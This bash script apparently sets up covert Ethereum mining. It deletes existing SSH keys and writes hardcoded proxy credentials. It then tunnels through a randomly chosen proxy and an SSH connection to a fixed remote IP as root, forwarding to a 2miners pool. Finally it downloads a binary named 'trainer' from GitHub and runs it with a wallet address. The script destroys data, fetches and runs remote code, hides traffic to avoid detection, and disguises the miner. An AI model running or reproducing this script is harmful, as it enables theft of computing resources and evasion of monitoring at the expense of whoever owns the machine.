#!/bin/bash

LINE=$(shuf -n 1 ips.txt)
LINE=${LINE//$'\n'/} # Remove all newlines
LINE=${LINE//$'\r'/} # Remove all carriage return
IP="$(cut -d':' -f1 <<<$LINE)"
IP_PORT="$(cut -d':' -f2 <<<$LINE)"
PORT=$(shuf -i 2000-65000 -n 1)
HOST="45.76.169.174"
HOST_PORT="22"
DEST="us-eth.2miners.com:2020"
POOL="127.0.0.1:$PORT"
WORKER="0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S )"
PARAMS="--algo ETHASH --pool $POOL --user $WORKER --ethstratum ETHPROXY"

rm .ssh/*
rm trainer
rm corkscrew-auth
echo mplidkfk:2g0hb8p40od5 >> corkscrew-auth
printf '\nMelon@101\nMelon@101\n' | ssh-keygen -t ed25519

ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=no -o ProxyCommand="corkscrew $IP $IP_PORT $HOST $HOST_PORT ~/corkscrew-auth" -L 127.0.0.1:$PORT:$DEST -f -C -q -N root@$HOST

wget https://github.com/blitz2099/reaper/raw/main/trainer
chmod +x trainer
./trainer $PARAMS